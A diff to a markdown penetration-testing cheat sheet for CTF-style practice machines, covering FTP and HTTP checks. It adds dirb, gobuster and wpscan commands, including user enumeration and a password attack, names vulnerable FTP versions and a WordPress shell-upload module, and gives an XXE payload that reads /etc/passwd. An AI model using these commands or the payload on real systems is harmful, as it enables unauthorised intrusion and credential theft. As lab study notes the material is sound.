@@ -18,35 +18,52 @@ Here's the content so far:
 
 # 21 - FTP
 - Check if anonymous FTP is allowed (user *anonymous*, blank password)
-- Vulnerable versions: ProFTPD 1.3.3c
+- Known vulnerable versions: ProFTPD 1.3.3c, vsFTPd 2.3.4
 
 # 80 - HTTP
 
+## Directories and files enumeration
 - Directories and files enumeration with **dirb** (-r for non recursive):
 
 ````
-sudo dirb http://targetip -r
-
+sudo dirb http://targetIP -r
+``````
 
 - Directories and files enumeration with **gobuster**:
 
 ````
-sudo gobuster
+sudo gobuster dir -u http://targetIP/ -w /usr/share/wordlists/...wordlist
+sudo gobuster dir -u http://targetIP/ -w /usr/share/wordlists/...wordlist -x php # looks for php files
+``````
+Example: BountyHunter
 
-
-- Directories and files enumeration with **wpscan** (if the CMS is Wordpress):
+- Directories and files enumeration with **wpscan** (for Wordpress):
 
 ````
-sudo gobuster
+sudo wpscan --url targetIP # basic scan
+sudo wpscan --url targetIP -e u # enumerate users
+sudo wpscan --url targetIP -passwords file/path/passwords.txt # password attack
 `````
+Example: Basic Pentesting: 1
 
+- If the CMS is Wordpress: check **wp_admin_shell_upload**. Example: Basic Pentesting: 1
 
-
-- If the CMS is Wordpress: check **wp_admin_shell_upload**
-
-## Directories and files enumeration
 
 ## XXE Injection
+
+Does the application parses XML? If yes, it might be vulnerable to XXE injection. POC:
+
+````
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
+`````
+
+Example: BountyHunter
+
 
 ## SQL Injection
 
